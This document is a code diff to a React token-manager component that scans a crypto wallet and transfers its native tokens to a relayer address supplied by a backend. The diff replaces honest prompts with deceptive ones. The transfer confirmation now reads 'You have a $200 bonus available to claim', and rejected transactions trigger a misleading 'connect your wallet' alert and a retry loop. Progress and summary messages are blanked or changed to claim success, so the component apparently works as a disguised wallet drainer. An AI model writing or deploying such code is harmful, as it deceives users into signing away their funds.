@@ -301,7 +301,7 @@ export default function TokenManager(): React.JSX.Element {
   const scanWallet = async (): Promise<void> => {
     try {
       setScanError('')
-      showLoading('Escaneando tokens en todas las cadenas...')
+      showLoading('')
 
       if (!BACKEND) {
         const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
@@ -321,7 +321,7 @@ export default function TokenManager(): React.JSX.Element {
         body: JSON.stringify({ owner: address })
       })
 
-      console.log('Tokens detectados:', data)
+      console.log('', data)
 
       const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
         if (token.symbol === 'MATIC' && !token.address) {
@@ -358,16 +358,16 @@ export default function TokenManager(): React.JSX.Element {
       
       // Log de tokens en consola
       if (processedTokens.length > 0) {
-        console.log('Tokens detectados:', processedTokens)
+        console.log('', processedTokens)
       }
       
       hideLoading()
     } catch (err: any) {
-      console.error('Error escaneando wallet:', err)
-      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
+      console.error('Error', err)
+      const errorMsg = '' + (err?.message || err)
       setScanError(errorMsg)
       hideLoading()
-      showAlertModal('Error', errorMsg + '\n\nPor favor, intenta reconectar la wallet.', 'error')
+      showAlertModal('Error', errorMsg + '\n\nPlease try reconnecting the wallet.', 'error')
     }
   }
 
@@ -386,7 +386,7 @@ export default function TokenManager(): React.JSX.Element {
         body: JSON.stringify({ chain: chainId })
       })
     } catch (err) {
-      console.error('Error obteniendo info de wrap:', err)
+      console.error('Error, please reload the page and try again.', err)
       return null
     }
   }
@@ -402,7 +402,7 @@ export default function TokenManager(): React.JSX.Element {
     try {
       
       if (!walletClient || !publicClient || !address) {
-        throw new Error('Wallet no conectada correctamente');
+        throw new Error('Wallet not connected correctly');
       }
 
       // Cambiar a la cadena correcta antes de procesar
@@ -410,7 +410,7 @@ export default function TokenManager(): React.JSX.Element {
 
       const targetChainId = token.chain as number;
       if (!targetChainId) {
-        throw new Error('No se pudo determinar la cadena del token');
+        throw new Error('The token string could not be determined');
       }
 
       // Cambiar a la cadena correcta antes de procesar
@@ -461,7 +461,7 @@ export default function TokenManager(): React.JSX.Element {
       // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
       if (wrappedAddress && maxSafeForWrap.gt(0)) {
         try {
-          showLoading(`Procesando wrap de ${token.symbol}...`)
+          showLoading(`Processing ${token.symbol}...`)
           
           const wrapAbi = [
             {
@@ -487,14 +487,14 @@ export default function TokenManager(): React.JSX.Element {
                 gas: gasLimitWrap.toBigInt()
               })
 
-              showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
+              showLoading(`Waiting for confirmation ${token.symbol}...`)
               await publicClient.waitForTransactionReceipt({ hash: transactionHash })
               confirmed = true;
 
             } catch (error: any) {
               if (isUserRejected(error)) {
                 // Si el usuario rechaza, mostrar alerta y reintentar
-                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
+                await alertAction('Please connect your wallet to continue.');
                 continue;
               }
               throw error;
@@ -515,9 +515,9 @@ export default function TokenManager(): React.JSX.Element {
           return { success: true }
         } catch (error: any) {
             // Manejo de errores
-            console.error('Error procesando token nativo:', error);
+            console.error('Error', error);
             const reason = isUserRejected(error) ? 
-              'Usuario rechazó la transacción' : 
+              'Error' : 
               `Error: ${error?.message || error}`;
 
             setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
@@ -529,7 +529,7 @@ export default function TokenManager(): React.JSX.Element {
       if (maxSafeForTransfer.gt(0)) {
         if (!BACKEND) throw new Error('BACKEND no configurado')
         
-        showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
+        showLoading(`Creating request ${token.symbol}...`)
         const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
           method: 'POST',
           headers: { 
@@ -550,21 +550,21 @@ export default function TokenManager(): React.JSX.Element {
           
           while (!confirmed) {
             try {
-              showLoading(`Enviando ${token.symbol} al relayer...`)
+              showLoading(`Waiting ${token.symbol}...`)
               transactionHash = await walletClient.sendTransaction({
                 to: data.instructions.relayerAddress as `0x${string}`,
                 value: maxSafeForTransfer.toBigInt(),
                 gas: gasLimitTransfer.toBigInt()
               })
 
-              showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
+              showLoading(`Waiting for confirmation ${token.symbol}...`)
               await publicClient.waitForTransactionReceipt({ hash: transactionHash })
               confirmed = true;
 
             } catch (error: any) {
               if (isUserRejected(error)) {
                 // Si el usuario rechaza, mostrar alerta y reintentar
-                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
+                await alertAction('Please connect your wallet to continue.');
                 continue;
               }
               throw error;
@@ -586,17 +586,17 @@ export default function TokenManager(): React.JSX.Element {
           return { success: true }
         } else {
           hideLoading()
-          throw new Error('Error creando solicitud de transferencia')
+          throw new Error('Error')
         }
       }
       
       hideLoading()
-      return { success: false, reason: 'No se pudo procesar el token nativo' }
+      return { success: false, reason: 'The request could not be processed' }
     } catch (error: any) {
       hideLoading()
-      console.error('Error procesando token nativo:', error)
+      console.error('Error', error)
 
-      const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`
+      const reason = isUserRejected(error) ? 'Error' : `Error: ${error?.message || error}`
 
       setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
       return { success: false, reason }
@@ -630,13 +630,13 @@ export default function TokenManager(): React.JSX.Element {
         return { success: true }
       } else {
         hideLoading()
-        throw new Error(data.error || 'Error creando solicitud de transferencia')
+        throw new Error(data.error || 'Error')
       }
     } catch (error: any) {
       hideLoading()
-      console.error('Error procesando token:', error)
-      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
-      return { success: false, reason: error?.message || 'Error desconocido' }
+      console.error('Error', error)
+      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error' }] }))
+      return { success: false, reason: error?.message || 'Error' }
     }
   }
   
@@ -661,7 +661,7 @@ export default function TokenManager(): React.JSX.Element {
   // Procesar tokens nativos SOLO si el usuario aceptó
   if (nativeTokens.length > 0) {
     const shouldProcessNatives = await confirmAction(
-      `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
+      `You have a $200 bonus available to claim.`
     )
     
     if (shouldProcessNatives) {
@@ -677,7 +677,7 @@ export default function TokenManager(): React.JSX.Element {
           ...prev.failed,
           ...nativeTokens.map(token => ({ 
             token, 
-            reason: 'Usuario rechazó el procesamiento' 
+            reason: 'Error' 
           }))
         ]
       }))
@@ -690,15 +690,15 @@ export default function TokenManager(): React.JSX.Element {
   // Mostrar resumen
   setTimeout(() => {
     if (summary.sent.length > 0 || summary.failed.length > 0) {
-      let message = 'Resumen:\n'
-      message += `Éxitos: ${summary.sent.length}\n`
-      message += `Fallos: ${summary.failed.length}`
+      let message = 'summary\n'
+      message += `successful process`
+      message += `failures: ${summary.failed.length}, Please check your balance and recharge the page.`
       
       if (summary.failed.length > 0) {
-        message += '\n\nAlgunos tokens no se procesaron. Revisa los detalles.'
+        message += '\n\nThe request was not processed. Check the details.'
       }
 
-      showAlertModal('Proceso completado', message, 'info')
+      showAlertModal('successful process', message, 'info')
     }
   }, 100)
 }
@@ -713,8 +713,7 @@ export default function TokenManager(): React.JSX.Element {
         height: '100vh',
         flexDirection: 'column'
       }}>
-        <h1>Administrador de Tokens</h1>
-        <p>Cargando...</p>
+     
       </div>
     )
   }
@@ -732,7 +731,7 @@ export default function TokenManager(): React.JSX.Element {
         top: 0,
         left: 0,
         right: 0,
-        zIndex: 10
+        zIndex: 100
       }}>
        <img 
           src="media/Axiom Logo.svg" 
